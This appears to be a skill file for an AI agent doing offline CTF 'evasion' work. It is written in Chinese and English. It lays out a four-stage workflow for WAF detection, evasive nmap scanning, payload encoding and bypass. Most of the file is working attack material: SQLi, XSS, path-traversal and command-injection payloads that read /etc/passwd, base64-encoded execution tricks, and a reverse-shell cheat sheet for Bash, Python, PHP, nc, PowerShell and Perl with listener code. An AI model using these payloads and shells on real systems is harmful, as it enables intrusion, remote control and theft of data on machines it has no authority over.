---
name: evasion
description: triggers: EVASION, 对抗规避, 免杀, EDR绕过, WAF绕过, 沙箱逃逸, 编码, shellcode, payload, 混淆, antivirus, defense evasion
---

# EVASION 对抗规避 — CTF 自动化工作流

**运行环境: 离线靶场，禁止外网。所有工具本地安装。**

## 工具清单

| 工具 | 安装 | 用途 |
|---|---|---|
| wafw00f | `pip install wafw00f`（已装） | WAF 识别 |
| nmap | `scoop install nmap`（已装） | 端口扫描（规避参数） |
| curl | 系统自带 | HTTP 请求测试 |
| Python | `D:/Scoop/apps/python/current/python.exe` | 脚本执行 |
| powershell | 系统自带 | Windows 脚本 |

> 注：msfvenom/metasploit/donut/mingw 未预装。优先用手工 payload + 编码绕过。

## 工作流：四阶段推进

### 阶段 1: 检测识别 Detection

```bash
# 1a. WAF 识别
wafw00f <target_url>

# 1b. 端口扫描规避
nmap -sS -Pn -T4 -f --mtu 24 <target_ip>  # 分片
nmap -sS -Pn -T4 --scan-delay 200ms <target_ip>  # 降速
nmap -sS -Pn -T4 -D RND:10 <target_ip>  # 诱饵

# 1c. 观察 WAF 响应
curl -v -H "User-Agent: sqlmap/1.0" <target_url>  # 恶意 UA
curl -v -X POST -d "' OR 1=1--" <target_url>  # SQLi payload
curl -v "<target_url>/?id=1' OR '1'='1"  # 直接 SQLi
```

### 阶段 2: Payload 生成 Payload

```bash
# 2a. 手工 Reverse Shell（无 msfvenom 时）
# 见下方速查表

# 2b. Base64 编码规避
echo -n '<payload>' | base64
# 执行
echo '<base64>' | base64 -d | bash

# 2c. URL 编码
python -c "import urllib.parse; print(urllib.parse.quote(\"<payload>\"))"

# 2d. PowerShell 编码
powershell -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('<command>'))"
# 执行
powershell -enc <base64_encoded>

# 2e. 多层编码
# URL encode → base64 → hex，层层嵌套
```

### 阶段 3: 绕过技术 WAF Bypass

```bash
# 3a. SQLi WAF 绕过
# 空格替换
' UNION/**/SELECT/**/1,2,3--
' UNION%0dSELECT%0d1,2,3--
# 大小写
' UnIoN SeLeCt 1,2,3--
# 注释注入
'/**/UNION/**/SELECT/**/1,2,3--
# 双编码
%2527%20UNION%20SELECT%201,2,3--

# 3b. XSS WAF 绕过
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<script>eval(atob('base64_payload'))</script>

# 3c. 路径遍历绕过
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd

# 3d. 命令注入绕过
;cat /etc/passwd
|cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)
%0acat /etc/passwd
||cat /etc/passwd
```

### 阶段 4: 验证与执行 Verify

```bash
# 4a. 本地监听
nc -lvnp <port>

# 4b. 执行 payload 看是否回连
# 上传/注入 payload 并执行

# 4c. 如果被拦截，迭代
# 切换编码方式 → 切换协议 → 切换语言
# 考虑：DNS 隧道、ICMP 隧道、HTTP 长轮询

# 4d. 无 nc 时的监听
# Python
python -c "exec(\"import socket;s=socket.socket();s.bind(('0.0.0.0',<port>));s.listen(1);c,a=s.accept();\nwhile True:print(c.recv(1024).decode(),end='')\")"
```

## Payload 速查表

### Reverse Shell（无 msfvenom）

| 语言 | Payload |
|---|---|
| Bash | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Python | `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
| PHP | `php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| nc | `nc -e /bin/sh IP PORT` |
| PowerShell | `powershell -c "$c=New-Object Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS>');$s.Write($sb,0,$sb.Length)}"` |
| Perl | `perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'` |

### SQLi WAF 绕过速查

| 技术 | 示例 |
|---|---|
| 注释截断 | `' UNION/**/SELECT` |
| 大小写 | `' UnIoN SeLeCt` |
| URL 编码 | `%27%20UNION%20SELECT` |
| 双编码 | `%2527%20UNION` |
| 空字节 | `%00' UNION SELECT` |
| 换行 | `%0a' UNION SELECT` |
| 内联注释 | `' /*!UNION*/ /*!SELECT*/` |
| 等价替换 | 空格→`/**/` 或 `%0a` 或 `+` 或 `` ` `` |

### 编码命令速查

```bash
# Base64 编码
echo -n "payload" | base64
# Base64 解码
echo "cGF5bG9hZA==" | base64 -d

# URL 编码 (Python)
python -c "import urllib.parse; print(urllib.parse.quote('payload'))"

# 十六进制编码
python -c "print('payload'.encode().hex())"

# PowerShell Base64
powershell -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('command'))"
```

## 判定规则

1. **payload 成功绕过 WAF 并回连** → 规避成功
2. **被拦截** → 分析拦截点，切换编码/加载方式
3. **WAF 识别成功** → 针对性选择绕过技术

## 离线环境

- 禁止 web_search/fetch_url
- 无 msfvenom/donut/mingw
- 主要靠手工 payload + 编码技巧